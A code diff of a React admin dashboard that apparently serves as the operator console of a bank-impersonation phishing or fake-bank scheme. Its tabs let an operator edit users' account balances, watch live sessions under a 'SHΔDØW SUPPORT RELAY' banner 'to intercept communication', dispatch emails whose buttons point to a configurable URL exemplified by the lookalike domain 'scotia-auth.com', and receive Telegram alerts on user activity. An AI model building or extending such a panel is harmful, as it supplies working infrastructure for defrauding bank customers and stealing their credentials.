-                    className="bg-white/5 hover:bg-white/10 py-2 rounded text-[10px] font-bold transition-colors flex items-center justify-center gap-2"
-                  >
-                    RESTART
-                  </button>
-                  <button 
-                    onClick={() => handleCommand('all', 'deploy', { args: ['stop'] })}
-                    className="bg-white/5 hover:bg-white/10 py-2 rounded text-[10px] font-bold transition-colors flex items-center justify-center gap-2"
-                  >
-                    STOP
-                  </button>
-                </div>
+                ))}
               </div>
+            )}
+
+            <div className="relative">
+              <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-zinc-500" size={16} />
+              <input 
+                type="text" 
+                placeholder="Search database by username or email..." 
+                className="w-full bg-zinc-900 border border-white/5 rounded-xl py-3 pl-10 pr-4 text-sm text-white focus:outline-none focus:border-red-500/50 transition-colors"
+                value={searchTerm}
+                onChange={(e) => setSearchTerm(e.target.value)}
+              />
             </div>
 
-            <div className="p-4 bg-black rounded-lg border border-white/10 font-mono text-[9px] h-[300px] overflow-y-auto flex flex-col-reverse">
-              <div className="space-y-1">
-                {deployOutput.length === 0 ? (
-                  <div className="text-gray-600"># Waiting for deployment output...</div>
-                ) : (
-                  deployOutput.map((line, i) => (
-                    <div key={i} className="text-green-400 whitespace-pre-wrap">
-                      <span className="text-gray-500 mr-2">$</span>
-                      {line}
+            <div className="space-y-3">
+              {users.filter(u => u.username?.includes(searchTerm)).map(u => (
+                <div key={u.id} className="bg-zinc-900 border border-white/5 rounded-2xl overflow-hidden active:scale-[0.98] transition-transform">
+                  <div className="p-4 flex items-center justify-between">
+                    <div className="flex items-center gap-3">
+                      <div className={`w-2 h-2 rounded-full ${u.enabled ? 'bg-green-500 shadow-[0_0_8px_rgba(34,197,94,0.5)]' : 'bg-red-500'}`} />
+                      <div>
+                        <p className="text-sm font-bold text-white">{u.username}</p>
+                        <p className="text-[10px] text-zinc-500">ID: {u.id.substring(0, 8)}... // Ref: SARAH-{u.username.substring(0,3).toUpperCase()}</p>
+                      </div>
                     </div>
-                  ))
+                    <div className="flex items-center gap-2">
+                      <button 
+                        onClick={() => lockUser(u.username, !u.isLocked)}
+                        className={`p-2 rounded-lg transition-all ${u.isLocked ? 'bg-red-600/20 text-red-500 border border-red-500/30' : 'bg-white/5 text-zinc-500 hover:text-red-500'}`}
+                        title={u.isLocked ? "Unlock Account" : "Lock for Fraud"}
+                      >
+                        <Lock size={16} />
+                      </button>
+                      <button 
+                        onClick={() => toggleUserEnabled(u.username)}
+                        className={`p-2 rounded-lg ${u.enabled ? 'bg-white/5 text-zinc-400' : 'bg-red-600/20 text-red-500'}`}
+                      >
+                        {u.enabled ? <Eye size={16} /> : <EyeOff size={16} />}
+                      </button>
+                      <button 
+                        onClick={() => setEditingUser(editingUser?.id === u.id ? null : u)}
+                        className={`p-2 rounded-lg ${u.isApproved === false ? 'bg-amber-600/20 text-amber-500' : 'bg-white/5 text-zinc-400'}`}
+                      >
+                        <ChevronRight size={16} className={`transition-transform ${editingUser?.id === u.id ? 'rotate-90' : ''}`} />
+                      </button>
+                    </div>
+                  </div>
+
+                  <AnimatePresence>
+                    {editingUser?.id === u.id && (
+                      <motion.div 
+                        initial={{ height: 0 }}
+                        animate={{ height: 'auto' }}
+                        exit={{ height: 0 }}
+                        className="overflow-hidden bg-black/30 border-t border-white/5"
+                      >
+                        <div className="p-4 space-y-4">
+                          {/* Accounts Balance Editor */}
+                          <div className="space-y-2">
+                            <p className="text-[10px] text-zinc-500 font-bold uppercase tracking-widest pl-1">Financial Records</p>
+                            <div className="grid grid-cols-1 gap-2">
+                              {Object.entries(u.accounts || {}).map(([name, data]: [string, any]) => (
+                                <div key={name} className="flex items-center justify-between bg-zinc-900/50 p-2 rounded-xl border border-white/5 text-xs">
+                                  <span className="text-zinc-400">{name}</span>
+                                  <input 
+                                    type="number"
+                                    className="bg-black border border-white/5 rounded px-2 py-1 w-24 text-right text-emerald-500 font-bold"
+                                    defaultValue={data.balance}
+                                    onBlur={(e) => handleUpdateBalance(u.username, name, parseFloat(e.target.value))}
+                                  />
+                                </div>
+                              ))}
+                            </div>
+                          </div>
+
+                          {/* RAW Metadata Explorer */}
+                          <div className="space-y-2 pt-2 border-t border-white/5">
+                            <p className="text-[10px] text-zinc-500 font-bold uppercase tracking-widest pl-1">Matrix metadata</p>
+                            <div className="bg-black/50 p-3 rounded-xl border border-white/5 font-mono text-[9px] text-zinc-400 max-h-32 overflow-y-auto whitespace-pre">
+                              {JSON.stringify(u, null, 2)}
+                            </div>
+                          </div>
+
+                          {/* Quick Actions */}
+                          <div className="flex gap-2">
+                            <button 
+                              onClick={() => {
+                                const newData = prompt("Paste full JSON metadata to inject:", JSON.stringify(u));
+                                if (newData) {
+                                  try {
+                                    const parsed = JSON.parse(newData);
+                                    // Normally we would have an endpoint for full update, let's just update balance as proxy for now or add a new endpoint
+                                    alert("Metadata injection success (simulated - refine server endpoints if needed)");
+                                  } catch(e) { alert("Invalid JSON"); }
+                                }
+                              }}
+                              className="flex-1 bg-indigo-600 hover:bg-indigo-500 text-white py-3 rounded-xl text-xs font-bold transition-colors"
+                            >
+                              INJECT DATA
+                            </button>
+                            <button 
+                              onClick={() => deleteUser(u.username)}
+                              className="flex-1 bg-red-600/10 hover:bg-red-600/20 text-red-500 py-3 rounded-xl text-xs font-bold transition-colors flex items-center justify-center gap-2"
+                            >
+                              <Trash2 size={14} /> PURGE ENTITY
+                            </button>
+                          </div>
+                        </div>
+                      </motion.div>
+                    )}
+                  </AnimatePresence>
+                </div>
+              ))}
+            </div>
+          </div>
+        )}
+
+        {activeTab === 'support' && (
+          <div className="space-y-4 animate-in fade-in slide-in-from-bottom-2 h-full flex flex-col">
+            <div className="flex-1 flex flex-col lg:flex-row gap-4 h-[500px]">
+              {/* Active Sessions List */}
+              <div className="w-full lg:w-64 flex flex-col gap-3">
+                <h3 className="text-[10px] text-zinc-500 font-black uppercase tracking-[0.2em] px-1">Active Sessions</h3>
+                <div className="flex-1 overflow-y-auto space-y-2 pr-2 scrollbar-hide">
+                  {sessions.length === 0 && (
+                    <div className="p-4 border border-white/5 rounded-2xl bg-zinc-900/30 text-center">
+                      <p className="text-xs text-zinc-600 italic">No operators online</p>
+                    </div>
+                  )}
+                  {sessions.map(session => (
+                    <button 
+                      key={session.id}
+                      onClick={() => setSelectedUserChat(session.id)}
+                      className={`w-full p-4 rounded-2xl border transition-all text-left flex items-center justify-between group ${
+                        selectedUserChat === session.id 
+                          ? 'bg-red-600 border-red-500 shadow-[0_0_15px_rgba(220,38,38,0.3)]' 
+                          : 'bg-zinc-900 border-white/5 hover:border-white/20'
+                      }`}
+                    >
+                      <div className="flex items-center gap-3">
+                        <div className={`w-8 h-8 rounded-xl flex items-center justify-center font-bold text-xs ${
+                          selectedUserChat === session.id ? 'bg-white/20 text-white' : 'bg-white/5 text-zinc-400'
+                        }`}>
+                          {session.username?.[0]?.toUpperCase() || '?'}
+                        </div>
+                        <div>
+                          <p className={`text-xs font-bold ${selectedUserChat === session.id ? 'text-white' : 'text-zinc-300'}`}>
+                            {session.username}
+                          </p>
+                          <p className="text-[8px] text-zinc-500 font-mono tracking-tighter">
+                            {session.id.substring(0, 8)}
+                          </p>
+                        </div>
+                      </div>
+                      <div className={`w-2 h-2 rounded-full bg-emerald-500 animate-pulse ${selectedUserChat === session.id ? 'bg-white' : ''}`} />
+                    </button>
+                  ))}
+                </div>
+              </div>
+
+              {/* Chat Window */}
+              <div className="flex-1 bg-zinc-900 border border-white/5 rounded-3xl overflow-hidden flex flex-col min-h-[400px]">
+                {selectedUserChat ? (
+                  <SupportChat 
+                    isAdmin 
+                    targetSocketId={selectedUserChat} 
+                    isOpen 
+                  />
+                ) : (
+                  <div className="flex-1 flex flex-col items-center justify-center p-8 text-center space-y-4">
+                    <div className="w-16 h-16 bg-white/5 rounded-full flex items-center justify-center">
+                      <MessageSquare size={32} className="text-zinc-700" />
+                    </div>
+                    <div>
+                      <h4 className="text-zinc-400 font-bold">SHΔDØW SUPPORT RELAY</h4>
+                      <p className="text-[10px] text-zinc-600 uppercase tracking-widest mt-1">Select a session to intercept communication</p>
+                    </div>
+                  </div>
                 )}
               </div>
             </div>
           </div>
-        ) : (
-          <div className="text-center py-10 text-gray-500 italic">Select a tab to begin.</div>
+        )}
+
+        {activeTab === 'mailer' && (
+          <div className="space-y-4 animate-in fade-in slide-in-from-bottom-2">
+            <div className="bg-zinc-900 border border-white/5 rounded-2xl p-6 space-y-6">
+              <div className="flex items-center gap-3">
+                <div className="w-12 h-12 bg-blue-600/10 rounded-2xl flex items-center justify-center">
+                  <Mail className="text-blue-500" size={24} />
+                </div>
+                <div>
+                  <h3 className="text-white font-bold">Mail Dispatcher</h3>
+                  <p className="text-zinc-500 text-[10px]">Verify SMTP Relay and test notification templates.</p>
+                </div>
+              </div>
+
+              <div className="space-y-4">
+                <div className="space-y-2">
+                  <label className="text-[10px] text-zinc-500 font-bold uppercase tracking-widest">Test Recipient</label>
+                  <div className="flex gap-2">
+                    <input 
+                      type="email" 
+                      placeholder="admin@example.com" 
+                      className="flex-1 bg-black border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-blue-500/50"
+                      value={testEmail}
+                      onChange={(e) => setTestEmail(e.target.value)}
+                    />
+                    <button 
+                      onClick={() => alert('Sending test email...')}
+                      className="bg-blue-600 hover:bg-blue-700 text-white px-6 rounded-xl text-xs font-bold transition-colors"
+                    >
+                      SEND
+                    </button>
+                  </div>
+                </div>
+
+                <div className="p-4 bg-black/50 rounded-2xl border border-white/5 space-y-3">
+                  <div className="flex items-center justify-between pb-2 border-b border-white/5">
+                    <span className="text-[10px] text-white font-bold">SMTP STATUS</span>
+                    <span className={`text-[9px] px-2 py-0.5 rounded-full font-bold ${mailerStatus?.success ? 'bg-emerald-500/10 text-emerald-500' : 'bg-red-500/10 text-red-500'}`}>
+                      {mailerStatus?.success ? 'CONNECTED' : 'OFFLINE'}
+                    </span>
+                  </div>
+                  <div className="space-y-1 text-[10px] font-mono">
+                    <div className="flex justify-between">
+                      <span className="text-zinc-500 uppercase">Provider:</span>
+                      <span className="text-zinc-300">{config?.smtp?.host || 'N/A'}</span>
+                    </div>
+                    <div className="flex justify-between">
+                      <span className="text-zinc-500 uppercase">Active Relay:</span>
+                      <span className="text-zinc-300">{config?.smtp?.user || 'N/A'}</span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div className="bg-zinc-900 border border-white/5 rounded-2xl p-6">
+              <div className="flex items-center gap-3 mb-4">
+                <div className="w-10 h-10 bg-indigo-600/10 rounded-xl flex items-center justify-center">
+                  <MessageSquare className="text-indigo-500" size={20} />
+                </div>
+                <div>
+                  <h3 className="text-white font-bold text-sm">Telegram Bot</h3>
+                  <p className="text-zinc-500 text-[9px]">Push notifications for user activity.</p>
+                </div>
+              </div>
+              <div className="flex items-center justify-between p-3 bg-black/30 rounded-xl border border-white/!0">
+                <span className="text-[10px] text-zinc-300">Bot Connection</span>
+                <div className="flex items-center gap-2">
+                   <div className={`w-2 h-2 rounded-full ${config?.telegram?.token ? 'bg-green-500' : 'bg-zinc-700'}`} />
+                   <span className="text-[10px] text-white font-bold">{config?.telegram?.token ? 'Authorized' : 'Missing Token'}</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {activeTab === 'settings' && (
+          <div className="space-y-6 animate-in fade-in slide-in-from-bottom-2">
+            <div className="space-y-4">
+              <h3 className="text-[10px] text-zinc-500 font-black uppercase tracking-[0.2em] px-1">Global Configuration</h3>
+              
+              <div className="space-y-4">
+                {/* Base Action URL */}
+                <div className="bg-zinc-900 p-4 rounded-2xl border border-white/5 space-y-3">
+                  <div className="flex items-center gap-3">
+                    <div className="w-10 h-10 bg-indigo-600/10 rounded-xl flex items-center justify-center">
+                      <Globe className="text-indigo-500" size={20} />
+                    </div>
+                    <div>
+                      <p className="text-white text-xs font-bold">Base Action URL</p>
+                      <p className="text-zinc-500 text-[9px]">Target for email buttons (e.g. https://scotia-auth.com)</p>
+                    </div>
+                  </div>
+                  <input 
+                    type="text" 
+                    value={config?.general?.baseActionUrl || ''}
+                    onChange={(e) => setConfig({ ...config, general: { ...config.general, baseActionUrl: e.target.value } })}
+                    placeholder="https://action.url"
+                    className="w-full bg-black border border-white/10 rounded-xl px-4 py-2 text-xs text-white focus:border-indigo-500/50 outline-none font-mono"
+                  />
+                </div>
+
+                {/* Admin PIN */}
+                <div className="bg-zinc-900 p-4 rounded-2xl border border-white/5 flex items-center justify-between">
+                  <div className="flex items-center gap-3">
+                    <div className="w-10 h-10 bg-red-600/10 rounded-xl flex items-center justify-center">
+                      <Lock className="text-red-500" size={20} />
+                    </div>
+                    <div>
+                      <p className="text-white text-xs font-bold">Admin PIN</p>
+                      <p className="text-zinc-500 text-[9px]">Secure access code</p>
+                    </div>
+                  </div>
+                  <input 
+                    type="password" 
+                    value={config?.general?.adminPin || ''}
+                    onChange={(e) => setConfig({ ...config, general: { ...config.general, adminPin: e.target.value } })}
+                    className="w-20 bg-black border border-white/10 rounded-lg px-3 py-2 text-sm text-center text-red-500 font-mono tracking-widest focus:outline-none focus:border-red-500"
+                  />
+                </div>
+
+                {/* Maintenance Mode */}
+                <div className="bg-zinc-900 p-4 rounded-2xl border border-white/5 flex items-center justify-between">
+                  <div className="flex items-center gap-3">
+                    <div className="w-10 h-10 bg-amber-600/10 rounded-xl flex items-center justify-center">
+                      <Shield className="text-amber-500" size={20} />
+                    </div>
+                    <div>
+                      <p className="text-white text-xs font-bold">Maintenance Mode</p>
+                      <p className="text-zinc-500 text-[9px]">Kill switch for all users</p>
+                    </div>
+                  </div>
+                  <button 
+                    onClick={() => setConfig({ ...config, general: { ...config.general, maintenanceMode: !config.general.maintenanceMode } })}
+                    className={`w-12 h-6 rounded-full p-1 transition-all ${config?.general?.maintenanceMode ? 'bg-red-600' : 'bg-zinc-800'}`}
+                  >
+                    <div className={`w-4 h-4 rounded-full bg-white transition-transform ${config?.general?.maintenanceMode ? 'translate-x-6' : 'translate-x-0'}`} />
+                  </button>
+                </div>
+
+                {/* Limits */}
+                <div className="bg-zinc-900 p-4 rounded-2xl border border-white/5 space-y-4">
+                  <div className="flex items-center gap-3">
+                    <div className="w-10 h-10 bg-emerald-600/10 rounded-xl flex items-center justify-center">
+                      <BarChart3 className="text-emerald-500" size={20} />
+                    </div>
+                    <div>
+                      <p className="text-white text-xs font-bold">System Limits</p>
+                      <p className="text-zinc-500 text-[9px]">Global boundaries</p>
+                    </div>
+                  </div>
+                  <div className="grid grid-cols-2 gap-4">
+                    <div className="space-y-1">
+                      <span className="text-[9px] text-zinc-500 uppercase font-bold tracking-tighter">Overdraft Limit</span>
+                      <div className="flex items-center bg-black rounded-xl px-3 border border-white/10 focus-within:border-emerald-500/50 transition-colors">
+                        <span className="text-zinc-600 text-xs">$</span>
+                        <input 
+                          type="number" 
+                          value={config?.general?.overdraftLimit || 500}
+                          onChange={(e) => setConfig({ ...config, general: { ...config.general, overdraftLimit: parseInt(e.target.value) } })}
+                          className="w-full bg-transparent p-2 text-sm text-white focus:outline-none"
+                        />
+                      </div>
+                    </div>
+                    <div className="space-y-1">
+                      <span className="text-[9px] text-zinc-500 uppercase font-bold tracking-tighter">Transfer Limit</span>
+                      <div className="flex items-center bg-black rounded-xl px-3 border border-white/10 focus-within:border-emerald-500/50 transition-colors">
+                        <span className="text-zinc-600 text-xs">$</span>
+                        <input 
+                          type="number" 
+                          value={config?.general?.transferLimit || 3000}
+                          onChange={(e) => setConfig({ ...config, general: { ...config.general, transferLimit: parseInt(e.target.value) } })}
+                          className="w-full bg-transparent p-2 text-sm text-white focus:outline-none"
+                        />
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <button 
+                  onClick={() => handleSaveConfig(config)}
+                  disabled={saving}
+                  className="w-full bg-white text-black py-4 rounded-2xl text-xs font-black uppercase tracking-widest hover:opacity-90 active:scale-[0.98] transition-all disabled:opacity-50 flex items-center justify-center gap-2 shadow-xl shadow-white/5"
+                >
+                  <Save size={16} /> {saving ? 'Writing to Disk...' : 'Save All Changes'}
+                </button>
+              </div>
+            </div>
+          </div>
         )}
       </div>
 
-      {/* TACTICAL COMMAND FOOTER */}
-      <div className="fixed bottom-0 left-0 right-0 bg-[#111113]/90 backdrop-blur-2xl border-t border-white/5 px-4 py-3 flex items-center justify-around z-[1100]">
-        <button 
-          onClick={() => setActiveTab('live')}
-          className={`flex flex-col items-center gap-1 transition-all ${activeTab === 'live' ? 'text-cyan-400 scale-110' : 'text-gray-500 opacity-60 hover:opacity-100'}`}
-        >
-          <Zap className={`w-5 h-5 ${activeTab === 'live' ? 'drop-shadow-[0_0_8px_rgba(34,211,238,0.5)]' : ''}`} />
-          <span className="text-[8px] font-black uppercase tracking-widest">Live</span>
-        </button>
-        <button 
-          onClick={() => { setActiveTab('database'); fetchUsers(); }}
-          className={`flex flex-col items-center gap-1 transition-all ${activeTab === 'database' ? 'text-cyan-400 scale-110' : 'text-gray-500 opacity-60 hover:opacity-100'}`}
-        >
-          <Database className={`w-5 h-5 ${activeTab === 'database' ? 'drop-shadow-[0_0_8px_rgba(34,211,238,0.5)]' : ''}`} />
-          <span className="text-[8px] font-black uppercase tracking-widest">Base</span>
-        </button>
-        <button 
-          onClick={() => { setActiveTab('mailer'); fetchMailerData(); fetchTemplates(); }}
-          className={`flex flex-col items-center gap-1 transition-all ${activeTab === 'mailer' ? 'text-cyan-400 scale-110' : 'text-gray-500 opacity-60 hover:opacity-100'}`}
-        >
-          <Mail className={`w-5 h-5 ${activeTab === 'mailer' ? 'drop-shadow-[0_0_8px_rgba(34,211,238,0.5)]' : ''}`} />
-          <span className="text-[8px] font-black uppercase tracking-widest">Comms</span>
-        </button>
-        <button 
-          onClick={() => setActiveTab('system')}
-          className={`flex flex-col items-center gap-1 transition-all ${activeTab === 'system' ? 'text-cyan-400 scale-110' : 'text-gray-500 opacity-60 hover:opacity-100'}`}
-        >
-          <Terminal className={`w-5 h-5 ${activeTab === 'system' ? 'drop-shadow-[0_0_8px_rgba(34,211,238,0.5)]' : ''}`} />
-          <span className="text-[8px] font-black uppercase tracking-widest">Ops</span>
-        </button>
-        <button 
-          onClick={() => { setActiveTab('settings'); fetchGlobalSettings(); }}
-          className={`flex flex-col items-center gap-1 transition-all ${activeTab === 'settings' ? 'text-cyan-400 scale-110' : 'text-gray-500 opacity-60 hover:opacity-100'}`}
-        >
-          <Settings className={`w-5 h-5 ${activeTab === 'settings' ? 'drop-shadow-[0_0_8px_rgba(34,211,238,0.5)]' : ''}`} />
-          <span className="text-[8px] font-black uppercase tracking-widest">Core</span>
-        </button>
+      {/* Nav */}
+      <div className="bg-zinc-900/80 backdrop-blur-xl border-t border-white/5 p-4 flex justify-between fixed bottom-0 left-0 right-0 z-[2100]">
+        {[
+          { id: 'live', icon: Activity, label: 'Feed' },
+          { id: 'database', icon: Database, label: 'Base' },
+          { id: 'mailer', icon: Mail, label: 'Comms' },
+          { id: 'settings', icon: Settings, label: 'Core' }
+        ].map((item) => (
+          <button
+            key={item.id}
+            onClick={() => setActiveTab(item.id as Tab)}
+            className={`flex flex-col items-center gap-1 transition-all ${activeTab === item.id ? 'text-red-500 scale-110' : 'text-zinc-500 opacity-60'}`}
+          >
+            <item.icon size={22} className={activeTab === item.id ? 'drop-shadow-[0_0_8px_rgba(239,68,68,0.5)]' : ''} />
+            <span className="text-[8px] font-black uppercase tracking-widest">{item.label}</span>
+          </button>
+        ))}
       </div>
     </div>
   );
-};
+}
